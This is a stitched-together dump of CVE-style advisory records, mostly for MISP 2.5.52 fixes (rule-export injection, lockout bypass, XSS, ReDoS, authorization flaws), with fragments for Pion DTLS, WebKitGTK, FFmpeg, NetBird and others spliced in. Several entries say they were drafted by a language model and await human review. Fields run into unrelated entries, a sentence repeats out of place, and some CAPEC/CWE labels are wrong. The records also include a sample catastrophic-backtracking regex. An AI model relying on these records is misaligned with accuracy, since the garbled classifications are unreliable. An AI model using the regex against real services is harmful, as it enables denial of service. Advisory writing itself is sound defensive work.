MISP's NIDS rule export functionality for Snort and Suricata formats does not properly escape user-controlled data before embedding it into generated rule text. Attribute values, tag names, and URL paths are inserted directly into rule options (msg, metadata, content matches) without neutralizing characters that are syntactically significant in the NIDS rule grammar, such as double quotes, semicolons, backslashes, commas, and control characters.

An authenticated user with the ability to create or modify attributes in a MISP instance can craft attribute values or tag names containing these special characters. When the NIDS rules are exported, the unescaped data breaks out of the intended option or content field, allowing injection of arbitrary rule options, corruption of rule structure, or generation of syntactically invalid rules that may cause the downstream NIDS engine to reject the entire ruleset.

The affected export paths include:
- Snort and Suricata msg: option (quotes, semicolons, backslashes, control characters)
- Suricata metadata: option (commas, semicolons, quotes, whitespace, control characters)
- Suricata http.uri content: match for URL path (quotes, semicolons, pipe characters)

Security impact is limited to the integrity and availability of the exported NIDS rules and the downstream NIDS engine that consumes them. There is no direct compromise of the MISP application itself.

Affected: MISP versions prior to 2.5.52.
CAPEC-4 Command Delimiter Injection

descriptions.description: CWE-116 Improper Encoding or Escaping of Output
CWE-74 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')

solutions.value: The fix introduces dedicated escaping functions that neutralize NIDS-rule-significant characters before they are embedded in generated rule text. For msg: options, control characters are replaced with underscores and backslashes, double quotes, and semicolons are backslash-escaped. For Suricata metadata fields, all whitespace, commas, semicolons, quotes, backslashes, and control characters are replaced with underscores. For content: matches, the existing illegal-character replacement is extended to hex-encode control characters. Additionally, the URL path in Suricata rules is now passed through the illegal-character escaper before being placed in the http.uri content match, and two dead assignments that incorrectly set the path from the host are removed.

descriptions.value:
MISP's brute-force lockout mechanism for login and one-time-password (OTP) authentication is susceptible to bypass through Unicode case-folding inconsistencies and input handling flaws.

- Email addresses containing non-ASCII capital letters are not counted toward the lockout threshold, permitting unlimited authentication attempts against a specific account.
- Database collation folding (accent and width variants) allows an attacker to reach a valid account using a folded alias of the email address without the attempt being recorded in the lockout counter.
- A password containing a NUL byte produces a distinct server error for known accounts while unknown accounts receive a different response, enabling username enumeration.

An unauthenticated remote attacker can exploit these issues to perform unlimited password brute-force attacks against any account and to enumerate valid user accounts.

Affected: MISP versions prior to 2.5.52
CAPEC-10 Leveraging Errors
CAPEC-22 HTTP Parameter Manipulation

descriptions.description: CWE-307 Improper Restriction of Excessive Authentication Attempts
CWE-176 Improper Handling of Unicode Encoding

solutions.value: The lockout key is now canonicalized using a single multibyte-aware case-folding function shared by both the storage and lookup paths, ensuring all case variants of an address are counted under one key. After a user is located via the database, the submitted address is re-canonicalized and compared to the stored address; if they differ (indicating a collation-fold match), authentication is forced to fail as an unknown account. NUL bytes in the password field are stripped before hashing so that known and unknown accounts produce identical responses.

descriptions.value:
MISP accepted compressed HTTP request bodies (gzip, brotli, zstd) and decompressed them before authentication was performed, with no limit on the size of the resulting decompressed data. An unauthenticated attacker could send a small compressed payload that expands to a very large decompressed body, exhausting server memory and causing a denial of service. Brotli and zstd, with their high compression ratios, made the attack particularly effective.

The vulnerability required no authentication and no special conditions beyond the ability to send an HTTP request with a Content-Encoding header. The impact is a complete loss of availability for the affected MISP instance.

descriptions.value:
MISP contains an authorization flaw in the data capture and import paths for events, galaxies, galaxy clusters, analyst data, and sightings. A user who is neither a sync user nor a site admin could create or import records attributed to an organisation other than their own, or cause the creation of a new organisation from a payload-supplied identifier.

The root cause is an inconsistent authorization check: the code validated one representation of the creator organisation (for example a numeric ID or a UUID field) while storing a different representation taken directly from the user-supplied payload. In the event import path, a MISP export naming another organisation or a fabricated one was accepted and stored under that organisation. In the galaxy, cluster, analyst data, and sighting capture paths, the nested organisation object from the payload was used to create or reference an organisation without verifying the caller's membership.

Impact:
- Data (events, galaxies, clusters, analyst notes, sightings) can be created under an organisation the attacker does not belong to, polluting that organisation's data and potentially exposing it to that organisation's members.
- New organisations can be created from attacker-supplied identifiers, introducing phantom entities into the MISP instance.
- The integrity of the threat-intelligence data store is compromised because attribution is no longer trustworthy.

Affected: MISP versions prior to 2.5.52.
CAPEC-114 Parameter Tampering
CAPEC-126 Exploiting Incorrectly Adjusted Privileges

descriptions.description: CWE-639 Authorization Bypass Through User-Controlled Key

solutions.value: The fix enforces a single, consistent authorization rule across all affected capture and import paths: a user who is neither a sync user nor a site admin may only store data under their own organisation. For events, a new helper method determines the exact organisation shape that will be persisted and rejects the operation if it does not match the caller's organisation. For galaxies, clusters, analyst data, and sightings, the payload-supplied organisation object is explicitly discarded and the creator is forced to the caller's own organisation, preventing both misattribution and creation of organisations from untrusted input.

descriptions.value:
MISP contains a DOM-based Cross-Site Scripting (XSS) vulnerability in the event report element rendering pipeline. The client-side sanitization function used to prepare values for doT templates only escaped ampersand, less-than, and greater-than characters. However, the templates place these values inside double-quoted HTML attributes. Because double-quote and single-quote characters were not escaped, a user with the ability to author or modify report element values could inject a quote character to break out of the attribute context and inject arbitrary HTML or JavaScript that executes in the viewing user's browser.

Preconditions:
- The attacker must be an authenticated user with permission to create or edit event report elements (e.g., a report author).
- A victim must open or view the crafted report in a browser.

Security impact:
- Execution of arbitrary JavaScript in the context of the victim's MISP session.
- Potential theft of session tokens, sensitive data, or unauthorized actions performed on behalf of the victim.

Affected versions: MISP prior to 2.5.52.
CAPEC-126 DOM-based Cross-Site Scripting
CAPEC-1 Cross Site Scripting

descriptions.description: CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
CWE-116 Improper Encoding or Escaping of Output

solutions.value: The sanitization function now additionally escapes double-quote characters to " and single-quote characters to ' after the existing ampersand/angle-bracket escaping. This ensures that values placed inside quoted HTML attributes by the doT templates cannot break out of the attribute context, eliminating the DOM-based XSS vector.

descriptions.value:
MISP contains an improper output sanitization vulnerability in the Zeek (Bro) intelligence export functionality.

The export module constructs tab-separated lines for downstream Zeek/Bro intelligence feeds. The sanitization routine was intended to strip tab, newline, and carriage-return characters from user-controlled fields (organisation names and attribute values) before they were embedded into the export line format. However, the sanitization pipeline applied character replacement before HTML entity decoding, meaning that HTML entities such as 	 (tab), 
 (newline), and  (carriage return) survived the initial pass and were subsequently decoded into actual separator characters. Additionally, organisation names were inserted into the export format string without any sanitization at all.

An authenticated user with the ability to create or modify events, organisation names, or attribute values could embed HTML-encoded separator characters. When the Zeek/Bro export was generated, these characters would split a single export line into multiple lines or introduce extra tab-delimited fields, corrupting the structured intelligence feed consumed by downstream Zeek/Bro deployments.

Security impact:
- Integrity of exported intelligence data is compromised; downstream Zeek/Bro systems may process malformed or split entries.
- Corrupted intelligence lines could lead to incorrect blocking, alerting, or logging decisions in the consuming environment.

Affected versions: MISP prior to 2.5.52.
CAPEC-143 HTTP Response Splitting

descriptions.description: CWE-74 Improper Neutralization of Special Elements in Output Used by a Downstream Component

solutions.value: The vulnerability is remediated by re-applying the separator-character stripping pass after HTML entity decoding, ensuring that tabs, newlines, and carriage returns introduced by entity decoding are removed. Additionally, organisation names are now passed through the same sanitization routine and have percent signs escaped before being inserted into the export line format string, preventing both separator injection and format-string interference.

PR:L assumes the attacker needs a standard authenticated MISP account with event/organisation write access; the patch does not specify exact permission requirements.
SI:L assumes the primary impact is corruption of exported intelligence data integrity in downstream Zeek/Bro consumers; the patch does not evidence any code-execution or privilege-escalation path.
The affected version range is taken from the explicit analyst context (affected_version 0, fixed_version 2.5.52); the patch itself does not encode version boundaries.
The commit date (2026-11-17) and co-author attribution to an AI assistant are taken at face value from the patch metadata; no independent verification is performed.

capecRationale.rationale: This CAPEC describes injecting line-break or separator characters into structured output to split a single logical record into multiple records. The MISP vulnerability is conceptually identical: an attacker injects tab and newline characters (via HTML entities) into a tab-separated, line-oriented export format, splitting one export line into multiple lines or adding spurious fields. The mapping is uncertain because CAPEC-143 is specifically framed around HTTP responses, whereas this case involves a custom intelligence-export format; however, the underlying technique of separator injection into structured output is the same, and no more specific CAPEC exists for arbitrary structured-data format injection.

AC:L - the attacker only needs to include HTML entities in a controlled field; no race or special condition is required. AT:N - no manipulation of the target system is needed beyond normal data entry. PR:L - the attacker must be an authenticated MISP user with permission to create or modify events, organisations, or attributes. UI:N - the export is generated server-side; no victim interaction is required. VC/VI/VA:N - the MISP instance itself is not compromised; the vulnerability affects only the content of the generated export. SC:N - no confidentiality impact on downstream systems. SI:L - the integrity of the exported Zeek/Bro intelligence feed is degraded (corrupted or split lines), which could mislead downstream consumers, but does not constitute a full integrity compromise of the downstream system. Additionally, organisation names are now passed through the same sanitization routine and have percent signs escaped before being inserted into the export line format string, preventing both separator injection and format-string interference.

descriptions.value:
MISP contains a denial-of-service vulnerability in its image processing pipeline. When generating attachment thumbnails or rendering event graph preview images, the application decodes user-supplied image data using the GD library without first validating the declared pixel dimensions in the image header.

Because GD allocates its pixel buffers outside the scope of PHP's memory_limit directive, a crafted image with an extremely large declared resolution (for example, 20000 x 20000 pixels) can trigger a multi-gigabyte memory allocation during the decode step, exhausting available system memory and causing the PHP worker process or the host to become unresponsive.

Preconditions:
- An authenticated MISP user with permission to upload attachments or to create/view event graphs.
- The ability to supply a crafted image file (e.g., a PNG with a valid header declaring oversized dimensions).

Impact:
- Denial of service: memory exhaustion leading to process crash or host unavailability.
- No confidentiality or integrity impact is indicated by the evidence.

Affected versions: MISP prior to 2.5.52.
CAPEC-124 Resource Exhaustion

solutions.value: The fix introduces a dimension guard before any GD decode operation. The image header is parsed first to extract the declared width and height; if the product of the two exceeds a 50-megapixel threshold (or is zero/negative), the decode is skipped and an error is returned. This prevents GD from allocating its out-of-memory_limit pixel buffer for oversized images. The guard is applied in both the attachment thumbnail resize path and the event graph picture rendering path.

cna.title: MISP: Denial of Service via Unbounded Image Decoding in Attachment Thumbnails and Event Graphs

ai_annotations.description: Draft vulnerability metadata was generated from a git-format patch using an Ollama-hosted language model. Human validation is required before publication.

assumptions: PR:L assumes that uploading attachments or creating event graphs requires an authenticated MISP user with appropriate permissions; the patch does not explicitly state the authentication model, but MISP is a role-based threat-intelligence platform and these are authenticated operations.

VA:H assumes that memory exhaustion from a single oversized image decode can crash the PHP worker process or the host, rendering the MISP instance unavailable. The commit message confirms GD buffers bypass memory_limit, supporting this assumption.

The 50-megapixel threshold is the developer-chosen limit; the exact memory impact of a 20000x20000 image (approximately 1.6 GB for a 32-bit RGBA buffer) is inferred from GD's 4-bytes-per-pixel allocation noted in the patch comment.

CAPEC-124 (Resource Exhaustion) is the closest standard attack pattern; no CAPEC specifically covers 'crafted image header causing out-of-band memory allocation in a library', so this is the best available match.

The affected version range starts at 0 (all prior versions) because the explicit context specifies affected_version as '0' and fixed_version as '2.5.52'; no earlier introduction commit is identified in the patch.

capecRationale.rationale: The attacker supplies a single crafted image whose header declares an extremely large resolution. When the server decodes it, GD allocates a correspondingly large buffer outside PHP's memory_limit, exhausting system memory. This matches the Resource Exhaustion pattern: a single request with a large payload exhausts a finite resource (memory). The mapping is confident because the commit message explicitly references GD buffers bypassing memory_limit and the tests demonstrate a 20000x20000 header triggering the issue.

AT:N - No prior tampering of system data is needed. PR:L - The user must be authenticated and have permission to upload attachments or create event graphs; unauthenticated users cannot trigger the code path. UI:N - No victim interaction beyond the attacker's own request is required. VC:N, VI:N - No confidentiality or integrity impact is evidenced. VA:H - Memory exhaustion can crash the PHP worker or the host, causing a complete loss of availability for all users of that instance. SC:N, SI:N, SA:N - No secondary component impact is indicated.

x_patch2vuln.patchSummary: Added a MAX_IMAGE_PIXELS constant (50,000,000) and a new static method createImageFromString() in AttachmentTool that calls getimagesizefromstring() to read header dimensions and rejects images exceeding the limit before invoking imagecreatefromstring(). The resizeImage() method now calls createImageFromString() instead of imagecreatefromstring() directly. EventGraph::getPictureData() was updated to delegate to AttachmentTool::createImageFromString() via a new protected createImage() wrapper, with an explicit false-check and exception. A new PHPUnit test file (AttachmentToolImageSizeTest.php) verifies that oversized headers are rejected without triggering a decode, zero-dimension images are rejected, and small valid images still process correctly in both code paths.

patches.subject: fix: [security] Images are decoded only when their header

x_patch2vuln.subject: fix: [security] Images are decoded only when their header

weaknessRationale.rationale: The application processes a user-supplied image without bounding the memory that the GD decode step will allocate. The declared pixel dimensions in the image header are attacker-controlled and are not validated before the decode, allowing an attacker to trigger unbounded memory allocation. This is a classic uncontrolled resource consumption (memory) issue.

The GD library allocates a pixel buffer proportional to the declared image dimensions without any application-level limit. The patch adds a 50-megapixel cap, confirming that no prior limit existed. This is a specific instance of allocating resources without limits.

descriptions.description: CWE-650: Trusting HTTP Permission Methods on the Server Side

descriptions.value: HortusFox is a self-hosted web application for collaborative plant management. Prior to 6.2, state-changing AdminController routes in app/config/routes.php accept GET requests. The affected AdminController in app/controller/admin.php does not invoke Asatru\Controller\PostValidator to check CSRF tokens. An unauthenticated attacker can induce a signed-in administrator to open a cross-site link, causing privileged actions such as changing environment settings, deleting users or locations, managing API keys, or clearing cached data. Pion DTLS: DTLS handshake signature scheme confusion allows peer impersonation

descriptions.description: CWE-347: Improper Verification of Cryptographic Signature

descriptions.value: Pion DTLS is a Go implementation of Datagram Transport Layer Security. From 2.0.0 until 3.1.13, the implementation selected signature verification based on the certificate public key while deriving the digest from the peer-controlled signature scheme without validating that the scheme, key type, and hash requirements were consistent. The affected verification functions are verifyKeySignature for ServerKeyExchange and verifyCertificateVerify for CertificateVerify. An unauthenticated network attacker who can redirect a DTLS handshake and obtain the genuine peer certificate can submit crafted handshake signatures that are accepted without possession of the certificate private key. This can let the attacker impersonate the peer and compromise the confidentiality and integrity of protected traffic; checking a WebRTC SDP certificate fingerprint does not prevent the attack because the genuine certificate is presented. The issue is fixed in version 3.1.13.

cna.title: Pion DTLS: Client authentication bypass when client and server connections share a session store

descriptions.value: Pion DTLS is a Go implementation of Datagram Transport Layer Security. From 2.1.0 until 3.1.14, a listener performing DTLS 1.2 resumption accepted a session created by an outbound client connection without checking which role created it. A malicious server previously contacted by the application can retain the outbound session secret, select the client-side cached session through its session key, and present it to the application's reachable listener when both connections share a SessionStore. The attacker must first complete an outbound connection. WebRTC users are not affected. The listener can accept application data without running its normal PSK callback or client-certificate authentication checks, allowing a peer trusted only for an outbound connection to gain unauthorized listener access. The issue is fixed in version 3.1.14.

cna.title: Pion DTLS: Oversized peer RSA keys allow excessive CPU consumption during DTLS handshakes

descriptions.value: Pion DTLS is a Go implementation of Datagram Transport Layer Security. From 2.0.0 until 3.1.13, peer certificates were parsed and their RSA public keys were passed to handshake signature and certificate-chain verification without an explicit modulus-size limit. A remote peer can provide a certificate with an unusually large attacker-chosen RSA modulus and an invalid signature; no corresponding private key or valid handshake signature is required to trigger the expensive operation. An RSA verification path must execute. A local ECDSA certificate does not prevent the peer from presenting an RSA certificate, and WebRTC deployments can be affected. Repeated or concurrent malicious handshakes can consume substantial CPU resources, delay legitimate connections, and reduce service availability. The issue is fixed in version 3.1.13.

Attackers can upload a crafted archive via POST /machines/{machine}/sources whose entries inflate far beyond declared sizes, filling the host disk and denying service to all workspaces.

cna.title: Webkitgtk: webkitgtk: out-of-bounds read in uiprocess via mismatched dmabufbufferattributes plane vectors

credits.value: Red Hat would like to thank Mindaugas (UnfactorLabs) for reporting this issue.

workarounds.value: To mitigate this avoid loading untrusted web content in affected WPE/GTK WebKit embeds, and keep the browser/WebKit packages updated so WebProcess exploit chains cannot be combined with this IPC bug. There is no practical configuration switch to disable only this DMA-BUF IPC path without breaking accelerated compositing.

descriptions.value: A flaw was found in the GLib DMA-BUF path of WebKitGTK. The UIProcess trusted fds.size() as the DMA-BUF plane count when handling AcceleratedBackingStore::DidCreateDMABufBuffer and copied offsets and strides without verifying that those vectors had the same length. A compromised WebProcess can send mismatched vector lengths, causing an out-of-bounds read in the privileged UIProcess. This can disclose UIProcess memory and crash the UIProcess, and may be used as part of a Web Content sandbox-escape chain.

cna.title: FFmpeg before 9.1 Uninitialized Memory Disclosure via DXA Demuxer CMAP Chunk

descriptions.value: FFmpeg before 9.1 contains an uninitialized memory disclosure vulnerability in dxa_read_packet() in libavformat/dxa.c that ignores short avio_read() results for CMAP palette data. Attackers can supply a crafted DXA stream over a stalling network source so uninitialized stack bytes are copied into returned video packets and decoded frames.

references.name: VulnCheck Advisory: FFmpeg before 9.1 Uninitialized Memory Disclosure via DXA Demuxer CMAP Chunk

descriptions.value: Contiki-NG through 5.2 contains an out-of-bounds write vulnerability in the MPL multicast engine that allows remote unauthenticated attackers to corrupt memory via unchecked seed ID lengths. descriptions.value:
MISP contains a Regular Expression Denial of Service (ReDoS) vulnerability in its Warninglist feature. Warninglist entries of type "regex" are evaluated against attribute values without any backtracking limit. An authenticated user with permission to add or import warninglist entries can supply a crafted regular expression pattern that triggers excessive backtracking in the PCRE engine, causing sustained CPU consumption and denial of service.

Additionally, imported warninglists were not validated for syntactic correctness before replacing existing entries, allowing malformed or malicious patterns to be persisted and later evaluated without prior rejection.

Preconditions:
- An authenticated account with the ability to create, edit, or import warninglist entries (users below site-admin level can add entries).
- The target MISP instance has at least one warninglist of type "regex" that will be evaluated against incoming attribute values.

Impact:
- Sustained CPU exhaustion leading to denial of service for all users of the MISP instance.
- Potential for cascading performance degradation on shared infrastructure.

Affected versions: MISP prior to 2.5.52.
CAPEC-10 Leveraging Execution Through Multiple Input Interpretation

solutions.value: The vulnerability is remediated by imposing a PCRE backtracking limit of 100000 steps during regex evaluation of warninglist entries. Patterns that exceed the limit or otherwise fail to evaluate are cached, skipped on subsequent evaluations, and logged once. The original backtracking limit is restored after evaluation. Additionally, the import path now validates all entries (regex and CIDR) before any existing data is replaced, preventing malformed or malicious patterns from being persisted.

cna.title: MISP Warninglist ReDoS via Unbounded Regex Backtracking

ai_annotations.description: Draft vulnerability metadata was generated from a git-format patch using an Ollama-hosted language model. Human validation is required before publication.

assumptions: PR:L assumes that any authenticated user with warninglist management permission (below site-admin) can add or import regex entries; the patch comment states 'users below site admin' can add entries, but the exact role/permission boundary is not fully specified in the patch.
AV:N assumes MISP is deployed as a network-accessible web application, which is its standard deployment model but not explicitly stated in the patch.
CAPEC-10 is the closest available mapping; no CAPEC specifically covers ReDoS or regex-based resource exhaustion. The mapping is approximate.
The affected version range is inferred from the explicit context (fixed in 2.5.52); the patch itself does not enumerate all prior affected versions.
The 100000 backtracking limit is a mitigation bound, not a guarantee of zero impact; a pattern that completes within the limit but still consumes significant CPU is not addressed by this fix.

capecRationale.rationale: The attacker crafts a regex pattern that, when interpreted by the PCRE backtracking engine, causes exponential resource consumption. The pattern is syntactically valid but semantically designed to exploit the engine's backtracking behavior. CAPEC-10 is the closest available CAPEC for exploiting an execution engine's interpretation of crafted input to cause resource exhaustion. Uncertainty: no CAPEC specifically names ReDoS; CAPEC-10 is selected as the best available match for leveraging an interpreter/engine's behavior through crafted input.

x_patch2vuln.cvssRationale: AV:N - MISP is a network-accessible web application. AC:L - crafting a ReDoS regex (e.g., /^(a+)+$/) is well-known and straightforward. AT:N - no manipulation of the attack target is required. PR:L - the patch comment explicitly states entries can be added by users below site-admin, so low-privilege authenticated access suffices. UI:N - the DoS occurs automatically when attributes are evaluated against the stored pattern; no victim interaction is needed. VC:N, VI:N - no confidentiality or integrity impact. VA:H - sustained CPU exhaustion renders the service unavailable. SC:N, SI:N, SA:N - no secondary impacts on other systems are evidenced.
x_patch2vuln.fixSummary: The vulnerability is remediated by imposing a PCRE backtracking limit of 100000 steps during regex evaluation of warninglist entries. Patterns that exceed the limit or otherwise fail to evaluate are cached, skipped on subsequent evaluations, and logged once. The original backtracking limit is restored after evaluation. Additionally, the import path now validates all entries (regex and CIDR) before any existing data is replaced, preventing malformed or malicious patterns from being persisted.

modelComparison.selectionNotice: The selected result is closest to model consensus; this heuristic does not establish factual correctness and human review remains required.

x_patch2vuln.patchSummary: In Warninglist.php: (1) Added a $failedRegexes array to cache patterns that fail evaluation. (2) Refactored validation into a shared entryErrors() method used by both beforeValidate() and import(). (3) In __evalRegex(), set pcre.backtrack_limit to 100000 before the evaluation loop, skip already-failed patterns, catch preg_match failures, log them via a new logFailedRegex() method, and restore the original limit in a finally block. (4) In import(), validate all entry values via entryErrors() before calling __updateList(), throwing an exception on validation failure. A new test file WarninglistRegexBoundTest.php verifies the backtracking bound, single-logging behavior, limit restoration, and import rejection of invalid regex/CIDR entries.

CWE-400 is the narrowest defensible mapping; CWE-1336 (Improper Input Validation) could also apply but CWE-400 more precisely captures the resource-exhaustion impact.

references.name: VulnCheck Advisory: Windmill 1.664.0 before 1.819.0 Approval Condition Bypass via Resume Signature Minting

descriptions.value: Windmill 1.664.0 before 1.819.0 contains an authorization bypass vulnerability that allows any workspace member to mint resume signatures for suspended jobs via create_job_signature, get_resume_urls and get_wac_approval_urls handlers. Members with any role, including operator, can obtain valid HMAC-signed resume URLs to approve flow steps despite self_approval_disabled or user_groups_required restrictions.

MISP contains an authorization bypass in the galaxy cluster detachment functionality. Users holding the sync role permission were incorrectly exempted from the tagger and organisation ownership checks when detaching galaxy clusters from events or attributes.

This allowed a sync user belonging to one organisation to remove galaxy cluster associations (threat intelligence tags) from events and attributes owned by a different organisation. The sync permission was intended for replication workflows, which never invoke the cluster detachment code path, but was erroneously used as a blanket authorization bypass.

Impact:
- Cross-organisation data integrity: a sync user can strip threat intelligence cluster associations from other organisations' events and attributes.
- Disruption of shared threat intelligence: removal of cluster tags can alter the analytical context of events visible to other users.

Preconditions:
- An authenticated user with the sync role permission (perm_sync) and tagger permission (perm_tagger).
- The target event or attribute must belong to a different organisation than the attacker.

Affected versions: MISP prior to 2.5.52.
CAPEC-100 Exploiting Incorrectly Configured Privileges

solutions.value: The fix removes the sync permission exemption from the authorization checks in the galaxy cluster detachment logic. Sync users are now subject to the same tagger and organisation ownership verification as all other non-site-admin users, ensuring they cannot detach clusters from events they do not own or create. The commit message confirms that replication workflows never invoke these code paths, making the sync exemption both unnecessary and dangerous.

cna.title: NetBird relay server WebSocket listener trusts client-supplied X-Real-IP and X-Real-Port headers, allowing source address spoofing

timeline.value: Reported to the vendor through a GitHub Security Advisory

solutions.value: Upgrade the NetBird relay server to version 0.75.0 or later. In this version the relay honours X-Real-Ip and X-Real-Port only for requests whose direct connection address is inside the set configured with the --trusted-proxies flag (a comma-separated list of CIDRs or IPs). When the set is empty, which is the default, the headers are ignored (pull request #6833). Operators who run the relay behind a reverse proxy and rely on the forwarded address must set --trusted-proxies to the proxy address after upgrading.

descriptions.value: Reliance on an untrusted source of the client address in the WebSocket listener of the NetBird relay server (relay/server/listener/ws) in NetBird versions 0.31.1 through 0.74.7 allows an attacker with an enrolled peer to spoof the source address of their relay connection. The listener used the values of the X-Real-Ip and X-Real-Port request headers as the remote address of the connection unconditionally, without checking that the request came from a trusted upstream proxy. A WebSocket client that sends both headers makes the relay record and use an arbitrary address for its connection, including in the relay connection log, so a client can hide its real address or attribute its connection to another host. Only the relay server is affected; the NetBird client, including the Android and iOS apps, does not run the relay listener. The issue is fixed in version 0.75.0, which honours these headers only for requests whose direct connection address is in a configured set of trusted proxies and ignores them by default.

descriptions.description: CWE-348 Use of Less Trusted Source

configurations.value: Only the NetBird relay server is affected.
